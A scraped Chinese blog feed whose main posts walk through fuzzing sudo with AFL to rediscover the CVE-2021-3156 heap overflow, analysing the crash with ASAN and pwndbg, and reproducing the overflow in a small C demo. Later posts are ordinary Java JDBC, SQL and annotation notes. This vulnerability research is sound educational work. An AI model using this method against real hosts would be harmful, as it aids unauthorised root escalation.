\\w\\a\\]\\[\\033[01;32m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]$ &quot;&#x27; &gt;&gt; /home/user/.bashrcUSER userWORKDIR /home/user 重新编译 123whereis afl-clang-fastls -lah /usr/local/bin/afl-clang-fastCC=afl-cc ./configure --disable-shared &amp;&amp; make -j8 开始fuzz，指令-T参数可以指定argv[0] 1afl-fuzz -i /tmp/in/ -o /tmp/out/ -T sudoedit ./src/sudo 我这里故意放了能够引起crash的样本进去只为了加速过程 分析新的crash 判断是否为误报 我直接使用作者的crash文件，你可以在：https://github.com/LiveOverflow/pwnedit/tree/main/episode05 中找到 id_000000,sig_06,src_000083+000451,time_23448104,op_splice,rep_8 ​ 检验下在我的环境里面是否会有crash root user gdb调试 原视频里面用的是GEF，这里我用pwndbg，新人(没有CTFpwn经验)建议用GEF 程序自动运行后停止了 说明这个错误是被malloc给抛出的 **这会是一个新的0day吗？**在最新平台上测试后发现并不是 简化crash 其实我做到这一步想到的是用afl-tmin，后来发现作者尝试其他方案失败后，我就直接用afl-tmin了 在user下检验 创建软链接 12ln -s /usr/local/bin/sudo 0editls -lah 0edit 运行测试 有趣的发现 结尾是xedit这种形式就可以调用sudoedit 使用ASAN分析漏洞 asan一直是一个很操蛋的工具，经常报错，作者也在这里报错很多，我也是直接展示正常（正常报错）做法 1make clean &amp;&amp; ./configure CFLAGS=&quot;-fsanitize=address,undefined -g&quot; LDFLAGS=&quot;-fsanitize=address,undefined&quot; CC=clang --disable-shared &amp;&amp; make -j8 送入mini_crash样例检测 如果没有加上--disable-shared的话，就算有-g参数，也不会知道具体代码在哪里 现在我们知道漏洞的位置在/plugins/sudoers/./sudoers.c:868的set_cmnd函数内 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110static intset_cmnd(void)&#123; struct sudo_nss *nss; char *path = user_path; int ret = FOUND; debug_decl(set_cmnd, SUDOERS_DEBUG_PLUGIN) /* Allocate user_stat for find_path() and match functions. */ user_stat = calloc(1, sizeof(struct stat)); if (user_stat == NULL) &#123; sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); debug_return_int(NOT_FOUND_ERROR); &#125; /* Default value for cmnd, overridden below. */ if (user_cmnd == NULL) user_cmnd = NewArgv[0]; if (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; if (ISSET(sudo_mode, MODE_RUN | MODE_CHECK)) &#123; if (def_secure_path &amp;&amp; !user_is_exempt()) path = def_secure_path; if (!set_perms(PERM_RUNAS)) debug_return_int(-1); ret = find_path(NewArgv[0], &amp;user_cmnd, user_stat, path, def_ignore_dot, NULL); if (!restore_perms()) debug_return_int(-1); if (ret == NOT_FOUND) &#123; /* Failed as root, try as invoking user. */ if (!set_perms(PERM_USER)) debug_return_int(-1); ret = find_path(NewArgv[0], &amp;user_cmnd, user_stat, path, def_ignore_dot, NULL); if (!restore_perms()) debug_return_int(-1); &#125; if (ret == NOT_FOUND_ERROR) &#123; if (errno == ENAMETOOLONG) audit_failure(NewArgc, NewArgv, N_(&quot;command too long&quot;)); log_warning(0, &quot;%s&quot;, NewArgv[0]); debug_return_int(ret); &#125; &#125; /* set user_args */ if (NewArgc &gt; 1) &#123; char *to, *from, **av; size_t size, n; /* Alloc and build up user_args. */ for (size = 0, av = NewArgv + 1; *av; av++) size += strlen(*av) + 1; if (size == 0 || (user_args = malloc(size)) == NULL) &#123; sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); debug_return_int(-1); &#125; if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; /* * When running a command via a shell, the sudo front-end * escapes potential meta chars. We unescape non-spaces * for sudoers matching and logging purposes. */ for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; while (*from) &#123; if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; &#125; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;; &#125; else &#123; for (to = user_args, av = NewArgv + 1; *av; av++) &#123; n = strlcpy(to, *av, size - (to - user_args)); if (n &gt;= size - (to - user_args)) &#123; sudo_warnx(U_(&quot;internal error, %s overflow&quot;), __func__); debug_return_int(-1); &#125; to += n; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;; &#125; &#125; &#125; if ((user_base = strrchr(user_cmnd, &#x27;/&#x27;)) != NULL) user_base++; else user_base = user_cmnd; /* Convert &quot;sudo sudoedit&quot; -&gt; &quot;sudoedit&quot; */ if (ISSET(sudo_mode, MODE_RUN) &amp;&amp; strcmp(user_base, &quot;sudoedit&quot;) == 0) &#123; CLR(sudo_mode, MODE_RUN); SET(sudo_mode, MODE_EDIT); sudo_warnx(U_(&quot;sudoedit doesn&#x27;t need to be run via sudo&quot;)); user_base = user_cmnd = &quot;sudoedit&quot;; &#125; TAILQ_FOREACH(nss, snl, entries) &#123; if (!update_defaults(nss-&gt;parse_tree, NULL, SETDEF_CMND, false)) &#123; log_warningx(SLOG_SEND_MAIL|SLOG_NO_STDERR, N_(&quot;problem with defaults entries&quot;)); &#125; &#125; debug_return_int(ret);&#125; 漏洞造成的原因在CVE那篇文章分析过了 简化漏洞模型 这里的视角更像是给CTF出题，我也确实一句这个漏洞出过一道，不过在这里我们后面会完成exp的编写，所以只写c程序分析就行了 精简一下上面的源代码，问题出现在这里 1234567891011if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; while (*from) &#123; if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; &#125; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;;&#125; 如果最后一个参数是\\的话，from++， 然后*to++ = *from++，此时的from指针就超出了边界，造成堆溢出 可以写一个小的例子调试一下 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;ctype.h&gt;#include &lt;string.h&gt;int main()&#123; char from[100]; puts(&quot;please input some data, max is 100&quot;); read(0,from,100); int len = strlen(from); char *src = from; char *to = (char *)malloc(len); char *dst = to+1; puts(&quot;start copy file&quot;); while(*src)&#123; if (src[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)src[1])) src++; *dst++ = *src++; &#125; *to++ = &#x27;\\n&#x27;; printf(&quot;src&gt; %s&quot;,from); printf(&quot;dst&gt; %s&quot;,to);&#125; 构造这样的特殊输入，在输入的时候已经输入0x18个字符串了，所以是malloc(0x18) 按照程序的效果，会将下一个chunk的头部份覆写为0xbbbbbbbb 成功覆盖掉，实现预期堆溢出的目标，说明当结尾的反斜杠后面还有数据的时候会产生堆溢出","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"SUDO堆溢出提权：从fuzz到exp [1]","slug":"sudo-fuzz2exp-1","date":"2022-04-11T02:40:44.000Z","updated":"2022-09-20T08:04:28.420Z","comments":true,"path":"2022/04/11/sudo-fuzz2exp-1/","link":"","permalink":"https://joe1sn.eu.org/2022/04/11/sudo-fuzz2exp-1/","excerpt":"SUDO堆溢出提权：从fuzz到exp [1] 前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit","text":"SUDO堆溢出提权：从fuzz到exp [1] 前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit My previous blog: https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ I was inspired by the LiveOverflow’s Sudo Vulnerability Walkthrough on youtube, but i found there’s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this “from fuzz to exploit” series. Original Videos: https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx Original Blog: https://liveoverflow.com/why-pick-sudo-research-target-part-1/ Source Project Code: https://github.com/LiveOverflow/pwnedit 本节内容： Why Pick sudo as Research Target? | Ep. 01 How Fuzzing with AFL works! | Ep. 02 环境搭建 在最开始的复现博客中，我最初打算在docker中搭建整个项目，但是由于在docker上exp需要微调和学业压力导致我并不能花太多时间在上面，所以我直接使用的虚拟机。不过在原始的备份文档中我依然保存了当时搭建docker的记录，这里和原作者使用的方法类似. Docker LiveOverflow在项目的git仓库中有了这个dockerfile文件。因为中国GFW，所以我换了下源，如果不需要可以删掉。我这里用的是windows的DesktopDocker搭建 ep1\\Dockerfile 12345678910111213FROM ubuntu:20.04ENV LC_CTYPE C.UTF-8ARG DEBIAN_FRONTEND=noninteractiveRUN sed -i &#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27; /etc/apt/sources.list &amp;&amp;\\ apt-get update &amp;&amp; \\ apt-get install -yq gcc make wget curl git vim gdb clang llvm python3 python3-pip bsdmainutilsRUN cd /root/ &amp;&amp; wget https://www.sudo.ws/dist/sudo-1.8.31p2.tar.gz &amp;&amp; tar -xvf sudo-1.8.31p2.tar.gz &amp;&amp; cd sudo-1.8.31p2 &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make installRUN cd /root/ &amp;&amp; git clone https://github.com/google/AFL &amp;&amp; cd AFL &amp;&amp; make &amp;&amp; cd llvm_mode &amp;&amp; make &amp;&amp; cd .. &amp;&amp; make installRUN useradd -ms /bin/bash userRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;31m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]# &quot;&#x27; &gt;&gt; /root/.bashrcRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;32m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]$ &quot;&#x27; &gt;&gt; /home/user/.bashrcUSER userWORKDIR /home/user 从 ubuntu20.04 的基础镜像中，设置编码为 ENV LC_CTYPE C.UTF-8，设置非交互式操作(ARG DEBIAN_FRONTEND=noninteractive)，升级源并安装必要的编译运行环境，之后下载有漏洞的 sudoedit 源代码编译安装。 之后在该docker中安装 AFL(American Fuzzy Lop) 的模糊测试软件，添加普通用户 user，最后修改命令提示符的界面美化一下并设置工作目录 你可以使用docker build . -t sudo1来创建docker，但是同时作者编写了一个makefile来方便管理 12345678910111213141516171819.PHONY : all stop build run attach rootall : stop build runstop: -docker stop sudo1 sleep 1 -docker rmi sudo1build: docker build --no-cache -t sudo1 .run: docker run --rm -v $(CURDIR):/pwd --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -d --name sudo1 -i sudo1attach: docker exec -it sudo1 /bin/bashroot: docker exec -u root -it sudo1 /bin/bash 在make run的时候设置了-v $(CURDIR):/pwd参数可以让该目录下的文件同样位于在docker中的/pwd中，但是由于我使用的是DesktopDocker+VsCode(Docker plugin)，对我来说不是很必要 所以可以make或者make build来创建docker &gt;&gt;遇到的问题 ERROR [4/8] RUN cd /root/ &amp;&amp; git clone https://github.com/google/AFL &amp;&amp; cd AFL &amp;&amp; make &amp;&amp; make install 中国大陆网络屏蔽了github，导致其无法git仓库，可以挂代理，或者在docker创建好过后再利用pwd文件夹放入afl docker搭建时间长 正常现象，更新下载的时间有点长，这取决于网速 创建容器make run 创建完成后使用make attach进入docker AFL 项目链接：https://lcamtuf.coredump.cx/afl/ American fuzzy lop is a security-oriented fuzzer that employs a novel type of compile-time instrumentation and genetic algorithms to automatically discover clean, interesting test cases that trigger new internal states in the targeted binary. This substantially improves the functional coverage for the fuzzed code. The compact synthesized corpora produced by the tool are also useful for seeding other, more labor- or resource-intensive testing regimes down the road. 编译安装AFL 这里我是去掉git afl的，所以后来要装上 问题：权限不够 以docker exec -it -u root ContainerID /bin/bash进入，然后编译安装afl就行了 开始FUZZ AFL编译sudo AFL的测试是以白盒测试为基础的，我们要使用AFL的编译器对代码进行重新编译；虽然黑盒也行，但是要依靠插桩和qemu 进入sudo文件夹 123CC=afl-gcc ./configure --disable-sharedmake cleanmake -j8 出现图中afl-as之类的提示字符，说明正在使用afl编译 AFL进行分析与fuzz AFL的分析方式有两种 输入为文件 1afl-fuzz -i input_cases -o output_cases -- ./app.bin @@ @@就代表我们的输入示例 输入为stdin输入流 1afl-fuzz -i input_cases -o output_cases -- ./app.bin 但是这里我们的是使用sudo参数处理的字符串 原作者通过搜索afl fuzz argv发现了在AFL的experimental实验性质文件夹中的argv-fuzz-inl.h头文件，具有以下描述 所以我们找到sudo main函数的文件，并且将argv-fuzz-inl.h复制到同一个文件夹下，然后在main函数附近添加AFL_INIT_ARGV()函数 AFL_INIT_ARGV()的原理 可以看原来的头文件： 1#define AFL_INIT_ARGV() do &#123; argv = afl_init_argv(&amp;argc); &#125; while (0) afl_init_argv 123456789101112131415161718192021222324static char** afl_init_argv(int* argc) &#123; static char in_buf[MAX_CMDLINE_LEN]; static char* ret[MAX_CMDLINE_PAR]; char* ptr = in_buf; int rc = 1; /* start after argv[0] */ if (read(0, in_buf, MAX_CMDLINE_LEN - 2) &lt; 0); while (*ptr) &#123; ret[rc] = ptr; /* insert &#x27;\\0&#x27; at the end of ret[rc] on first space-sym */ while (*ptr &amp;&amp; !isspace(*ptr)) ptr++; *ptr = &#x27;\\0&#x27;; ptr++; /* skip more space-syms */ while (*ptr &amp;&amp; isspace(*ptr)) ptr++; rc++; &#125; *argc = rc; return ret;&#125; 本质上该函数就是一个宏定义，将原始的argv替换为afl_init_argv，从而能被后续的fuzzer所分析 afl_init_argv流程 输入流in_buf开始读取 指针不为NULL和空格一直读取 出现空格或NULL置结尾为NULL， 若为空格，参数数目rc+1 最后返回ret，让ret代替了原来的argv，同时argc被改写为rc 重编译sudo 12CC=afl-gcc ./configure --disable-sharedmake clean &amp;&amp; make -j8 这里就直接略过afl的测试了，因为肯定会崩溃 AFL是如何工作的 这里开始是第二节的内容了。 我们的主要目标是fuzz出sudo存在的CVE-2021-3156漏洞，然后完成exp的编写，所以并不会细致的讲解fuzz的具体工作原理和过程。不过fuzz主要有以下几个过程： 预处理 分析和获取有用信息，使用PIN，符号执行，污点检查 黑盒白盒 输入构建 从数据 SSS（种子）产生大量变异数据 III。 输入选择 过滤无效数据，优化模糊测试 评估 大多数关于模糊的研究集中在两个指标上：覆盖率和利用漏洞的平均时间 关于上一节的报错 这里就体现了互联网的艺术：https://milek7.pl/howlongsudofuzz/，这篇文章遇到了相同的问题他的解决方案是： 将afl-gcc编译器替换为基于LLVM的afl-clang编译 For some reason afl-gcc instrumentation didn’t work, so I used LLVM-based one. We just need to override CC for ./configure: 1CC=afl-clang-fast ./configure Clang是个啥？ 了解过编译原理的人，或者编写恶意代码的人对这个一定很熟悉 The Clang project provides a language front-end and tooling infrastructure for languages in the C language family (C, C++, Objective C/C++, OpenCL, CUDA, and RenderScript) for the LLVM project. Both a GCC-compatible compiler driver (clang) and an MSVC-compatible compiler driver (clang-cl.exe) are provided. You can get and build the source today. 编译器的结构 简单理解的话就是说Clang是gcc编译器的另外一个实现 同时AFL也支持使用afl-clang，和afl-gcc的用法相同 The clang wrappers (afl-clang and afl-clang++) can be used in the same way; clang users may also opt to leverage a higher-performance instrumentation mode, as described in llvm_mode/README.llvm. 这就涉及到afl-clang-fast的安装了 解决上一节的报错 安装afl-clang和afl-clang++ 安装clang和llvm（dockerfile中已经提前装好了） 1sudo apt-get install llvm clang 进入编译安装afl-clang和afl-clang++ 1234cd llvm_modemakecd ..make install 重编译sudo 1CC=afl-clang-fast ./configure --disable-shared &amp;&amp; make -j8 这里我发现其实在user用户下也会Segmentation fault，这个是因为权限的问题，后面就大致能感受出来了 开始Fuzz 创建输入输出 123mkdir ../input ../outputecho -en &quot;-l\\x00&quot; &gt; ../input/testcase1afl-fuzz -i ../input/ -o ../output/ -- ./src/sudo AFL的说明 AFL是以基于覆盖率测试的模糊测试工具，将编译过的数据送到被测试的程序中。被测试的程序中有使用AFL编译器编译时的插桩代码(__afl_maybe_log)，可以让编译器返回那些函数被执行过（被覆盖到） 例如在windows的模糊测试中，可以使用DynamoRIO对文件进行覆盖率测试 12D:\\HackTools\\Fuzz\\winafl\\build_x64\\bin\\Release&gt;D:\\HackTools\\Fuzz\\DynamoRIO-Windows-8.0.0-1\\bin64\\drrun.exe -t drcov -- test.exe not_kitty.bmpError 1 然后再IDA中加载覆盖率文件 其中绿色的就是单次执行被覆盖到的代码，被覆盖到的代码越多，测试也就越准确。 所以AFL可以通过插桩代码，不断改进输入的数据，从而得到更高的覆盖率 会得到漏洞吗？ 不会的，在前文中已经写过了 sudoedit就是一个链接到sudo的文件 但是我们是尝试独立挖掘出这个漏洞，并且 sudoedit 是作为独立插件编译得，所以我们并不能直接的测试sudoedit -s 在测试前了解你要测试的程序 123man sudowhereis sudowhereis sudoedit &gt;&gt;问题 This system has been minimized by removing packages and content that are not required on a system that users do not log into.To restore this content, including manpages, you can run the ‘unminimize’ command. You will still need to ensure the ‘man-db’ package is installed. 解决方法和造成原因在这儿：https://github.com/docker/for-linux/issues/639#issuecomment-478765756 直接输入unminimize，这会花很长的时间，真的很长 新的思路 细心一点可能会发现在之前的 123456789101112131415161718192021222324static char** afl_init_argv(int* argc) &#123; static char in_buf[MAX_CMDLINE_LEN]; static char* ret[MAX_CMDLINE_PAR]; char* ptr = in_buf; int rc = 1; /* start after argv[0] */ if (read(0, in_buf, MAX_CMDLINE_LEN - 2) &lt; 0); while (*ptr) &#123; ret[rc] = ptr; /* insert &#x27;\\0&#x27; at the end of ret[rc] on first space-sym */ while (*ptr &amp;&amp; !isspace(*ptr)) ptr++; *ptr = &#x27;\\0&#x27;; ptr++; /* skip more space-syms */ while (*ptr &amp;&amp; isspace(*ptr)) ptr++; rc++; &#125; *argc = rc; return ret;&#125; 其中rc=1，说明是从argv[1]开始创建fake_argv的，但是我们知道argv[0]就是程序自身，那么我们就可以通过fuzz argv[0]从而找到sudoedit。那么修改试试看，重新编译sudo &gt;&gt;问题 为什么没有变化 改的是同级目录下的argv-fuzz-inl.h文件 **为什么都一样？**问题的解决同样在这里：https://milek7.pl/howlongsudofuzz/ Quick test shows that sudo/sudoedit selection doesn’t work correctly from testcases passed in stdin, because for some reason it uses __progname. sudo/sudoedit不会直接使用argv[0]作为程序名称，而是使用__progname 阅读sudo源代码我们发现 在main中 参数数目&gt;0，传递argv[0]，否则使用sudo作为参数 在ep1\\sudo-1.8.31p2\\lib\\util\\progname.c: init_progname中 定义了HAVE___PROGNAME，那么在编译时如果__progname不存在，才会用argv[0]做成程序名 （因为vscode认为是windwos环境，所以这里是灰色的） 解决：直接删掉后重新编译 开始多核fuzz -M 选定主fuzz的单元（Master） 1afl-fuzz -M master -i /tmp/in -o /tmp/out/ -- ./src/sudo -S 选定为从属fuzz单元（Slave） 1afl-fuzz -S slave -i /tmp/in -o /tmp/out/ -- ./src/sudo","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"JavaWeb笔记-JDBC","slug":"java-day3-JDBC","date":"2022-03-19T11:49:07.000Z","updated":"2022-09-20T08:03:59.519Z","comments":true,"path":"2022/03/19/java-day3-JDBC/","link":"","permalink":"https://joe1sn.eu.org/2022/03/19/java-day3-JDBC/","excerpt":"JDBC操作 基本概念 快速入门 对JDBC中各个接口和类详解","text":"JDBC操作 基本概念 快速入门 对JDBC中各个接口和类详解 JDBC概念 **概念：**Java DataBase Connectivity ，Java数据库连接 本质（类似Django的ORM）:The sun公司定义的一套操作所有关系型数据库的规则（接口）。各个厂家根据接口去实现。我们可以是有这套接口编程，真正的驱动时jar包中的实现类 快速入门 简单步骤 导入驱动jar包 注册驱动 数据库连接对象Connection 定义sql 获取执行SQL语句的Statement对象 执行sql，接受返回结果 处理结果 释放资源 简单使用 123456789101112131415161718192021222324252627282930package learn.jdbc;import java.sql.Connection;import java.sql.DriverManager;import java.sql.Statement;/*JDBC快速入门 */public class JdbcDemo1 &#123; public static void main(String[] args) throws Exception &#123; //1.导入驱动jar包 //2.注册驱动 Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); //3.获取数据库连接对象 Connection conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/javaweb&quot;,&quot;root&quot;,&quot;J8L 7T&quot;); //4.定义sql语句 String sql = &quot;update user set UID=00000 where XH=302&quot;; //5.获取执行sql对象 Statement statement = conn.createStatement(); //6.执行sql方法 int count = statement.executeUpdate(sql); //7.处理结果 System.out.println(count); //8.释放资源 statement.close(); conn.close(); &#125;&#125; 步骤详解 DriverManager：驱动管理对象 注册驱动 注册与给定的驱动程序 DriverManager 1static void registerDriver(Driver driver) 写代码使用 1Class.forName(&quot;com.mysql.jdbc.Driver&quot;); 为静态代码使用 12345package com.mysql.cj.jdbc;public class Driver extends com.mysql.cj.jdbc.NonRegisteringDriver implements java.sql.Driver &#123; public Driver() throws java.sql.SQLException &#123; /* compiled code */ &#125;&#125; mysql5.0以上可以不用注册驱动 获取数据库连接 尝试建立与给定数据库URL的连接。 1static Connection getConnection(String url, String user, String password) url：jdbc:mysql://ip:port/database 默认为本地sql地址及默认端口 Connection：数据库连接对象 获取执行sql对象 1Statement createStatement() 1PreparedStatement prepareStatement(String sql) 管理事务 开启事务：参数为false即开启事务 1void setAutoCommit(boolean autoCommit) 提交事务 1void commit() 回滚事务 1void rollback() Statement：执行sql对象 执行任意sql 1boolean execute(String sql) 执行DML DDL语句，返回影响的行数 1int executeUpdate(String sql) 1ResultSet executeQuery(String sql) ResultSet：结果集对象 PreparedStatement：执行sql对象 JDBC工具类：JDBCUtils 目的：简化书写 分析： 注册驱动也抽取 抽取一个方法获取连接对象 抽取方法释放资源 抽取连接对象 1 close释放资源重载 123456789101112131415161718192021222324252627282930313233343536373839404142public static void close(Statement stmt, Connection conn)&#123; if(stmt != conn)&#123; try &#123; stmt.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if(conn != null) &#123; try &#123; conn.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125;&#125;//释放方法2public static void close(ResultSet rs, Statement stmt, Connection conn)&#123; if (rs != conn)&#123; try&#123; rs.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if(stmt != conn)&#123; try &#123; stmt.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if(conn != null) &#123; try &#123; conn.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125;&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"JavaWeb笔记-数据库","slug":"java-d2-database","date":"2022-03-18T08:26:12.000Z","updated":"2022-09-20T08:03:46.760Z","comments":true,"path":"2022/03/18/java-d2-database/","link":"","permalink":"https://joe1sn.eu.org/2022/03/18/java-d2-database/","excerpt":"","text":"JavaWeb笔记-数据库 SQL分类 数据查询语言（DQL） 数据查询语言（Data Query Language, DQL）是SQL语言中，负责进行数据查询而不会对数据本身进行修改的语句，这是最基本的SQL语句。保留字SELECT是DQL（也是所有SQL）用得最多的动词，其他DQL常用的保留字有FROM，WHERE，GROUP BY，HAVING和ORDER BY。这些DQL保留字常与其他类型的SQL语句一起使用。 数据定义语言（DDL）(CRUD) 数据定义语言 (Data Definition Language, DDL) 是SQL语言集中，负责数据结构定义与数据库对象定义的语言，由CREATE、ALTER与DROP三个语法所组成，最早是由 Codasyl (Conference on Data Systems Languages) 数据模型开始，现在被纳入 SQL 指令中作为其中一个子集。 数据操纵语言（DML） 数据操纵语言（Data Manipulation Language, DML）是SQL语言中，负责对数据库对象运行数据访问工作的指令集，以INSERT、UPDATE、DELETE三种指令为核心，分别代表插入、更新与删除。 数据控制语言（DCL） 数据控制语言 (Data Control Language) 在SQL语言中，是一种可对数据访问权进行控制的指令，它可以控制特定用户账户对数据表、查看表、预存程序、用户自定义函数等数据库对象的控制权。由 GRANT 和 REVOKE 两个指令组成。DCL以控制用户的访问权限为主，GRANT为授权语句，对应的REVOKE是撤销授权语句。 指针控制语言（CCL） 它的语句，像DECLARE CURSOR，FETCH INTO和UPDATE WHERE CURRENT用于对一个或多个表单独行的操作。 事务处理语言（TPL） 它的语句能确保被DML语句影响的表的所有行及时得以更新。TPL语句包括BEGIN TRANSACTION，COMMIT和ROLLBACK。","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"JavaWeb笔记-注解","slug":"java-d1-annotation","date":"2022-03-16T12:49:29.000Z","updated":"2022-09-21T04:28:46.667Z","comments":true,"path":"2022/03/16/java-d1-annotation/","link":"","permalink":"https://joe1sn.eu.org/2022/03/16/java-d1-annotation/","excerpt":"注释部分","text":"注释部分 注解 概念：说明程序。For计算机 从JDK1.5开始，Java增加对元数据的支持，也就是注解，注解与注释是有一定区别的，可以把注解理解为代码里的特殊标记，这些标记可以在编译，类加载，运行时被读取，并执行相应的处理。通过注解开发人员可以在不改变原有代码和逻辑的情况下在源代码中嵌入补充信息。 注释：用文字描述程序。For程序员 作用 编写文档：标识生成doc文档 1234567891011121314package LearnJunit.annotation;/** * 注解 java doc演示 * @since 1.5 * @author joe1sn * @version 1.0 */public class AnnoDemo1 &#123; //计算两数之和 public int add(int a, int b)&#123; return a+b; &#125;&#125; javadoc AnnoDemo1.java -encoding UTF-8 -charset UTF-8 123456789101112131415161718正在加载源文件AnnoDemo1.java...正在构造 Javadoc 信息...标准 Doclet 版本 1.8.0_301正在构建所有程序包和类的树...正在生成.\\AnnoDemo1.html...正在生成.\\package-frame.html...正在生成.\\package-summary.html...正在生成.\\package-tree.html...正在生成.\\constant-values.html...正在构建所有程序包和类的索引...正在生成.\\overview-tree.html...正在生成.\\index-all.html...正在生成.\\deprecated-list.html...正在构建所有类的索引...正在生成.\\allclasses-frame.html...正在生成.\\allclasses-noframe.html...正在生成.\\index.html...正在生成.\\help-doc.html... 代码检查：代码分析（使用反射） 例子： @Override 也可以自定义注解【使用反射】 让编译器实现基本的检查 JDK预定义注解 @Override 编译检查，检查被标记方法是否是被父类覆写的方法 @Deprecated 该注解内容已过时 @SuppressWarnings 压制警告，需要传参，一般传递&quot;all&quot;压制所有警告 自定义注解及使用(解析) 格式 1234@Target(ElementType.METHOD)@Retention(RetentionPolicy.SOURCE)public @interface Override &#123;&#125; 1234元注解public @interface 注解名称&#123; 属性列表&#125; 本质：注解本质上就是一个接口，接口默认继承Annotation() 12public interface MyAnno extends java.lang.annotation.Annotation &#123;&#125; 属性：接口中可以定义的成员方法 要求： 属性返回类型 基本数据类型 String 枚举 注解 以上类型数组 1234567public @interface MyAnno &#123; int show1(); String show2(); Person per(); //枚举 MyAnno2 anno2();//注解 String[] strs();//字符串数组&#125; 定义的属性在使用时需要给属性赋值 缺少赋值： 只留下show1进行赋值 默认赋值 1234public @interface MyAnno &#123; int age(); String name() default &quot;Doe&quot;;&#125; 如果只有一个属性需要赋值，如果属性名称是value，直接赋值 123456package LearnJunit.annotation;@MyAnno(1)public class Worker &#123;&#125; 对于枚举、注解、字符串的注解 12345678@MyAnno(age=1, per=Person.P1, anno2=@MyAnno2,// strs=&#123;&quot;1&quot;,&quot;a&quot;,&quot;v&quot;&#125; strs = &quot;abcdefg&quot;)public class Worker &#123;&#125; 元注解：用于描述注解的注解 @Target：描述注解能够作用的位置 ElementType取值： TYPE：作用于类上 METHOD：作用于方法上 FIELD：作用于成员变量上 12345678//表示anno3注解只能作用于类上@Target(value = &#123; ElementType.TYPE, ElementType.METHOD, ElementType.FIELD&#125;)public @interface MyAnno3 &#123;&#125; @Retention：描述注解能被保留的阶段 RetentionPolicy：判断在哪个阶段，使用该注解 SOURCE CLASS RUNTIME（一般使用这个）：会保留到class字节码文件中，并被JVM读取到 @Documented：描述注解是否被抽取到api文档中 123456@MyAnno3public class Worker &#123; public String name = &quot;John&quot;; @MyAnno3 public void show()&#123;&#125;;&#125; 1234567891011121314151617181920/** * - @Target：描述注解能够作用的位置 - 